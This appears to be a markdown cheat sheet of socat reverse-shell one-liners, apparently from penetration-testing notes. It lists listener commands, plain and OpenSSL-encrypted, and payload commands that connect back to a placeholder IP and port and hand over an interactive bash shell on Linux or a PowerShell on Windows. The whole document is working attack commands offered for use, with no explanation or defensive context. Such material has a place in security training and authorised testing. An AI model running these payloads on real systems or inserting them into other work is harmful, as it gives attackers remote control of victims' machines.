+ **Socat reverse-shell(listener)**:
```
socat tcp-l:<port> file:`tty`,raw,echo=0
socat openssl-listen:<port>,cert=<cert.pem>,verify=0 file:\`tty\`,raw,echo=0
```

+ **Socat reverse-shell(linux payload)**:
```
socat tcp:<ip>:<port> exec:"bash -li",pty,stderr,sigint,setsid,sane
socat openssl:<ip>:<port>,verify=0 exec:"bash -li",pty,stderr,sigint,setsid,sane
```

+ **Socat reverse-shell(windows payload)**:
```
socat tcp:<ip>:<port> exec:"powershell.exe",pipes
socat openssl:<ip>:<port>,verify=0 exec:"powershell.exe",pipes
```
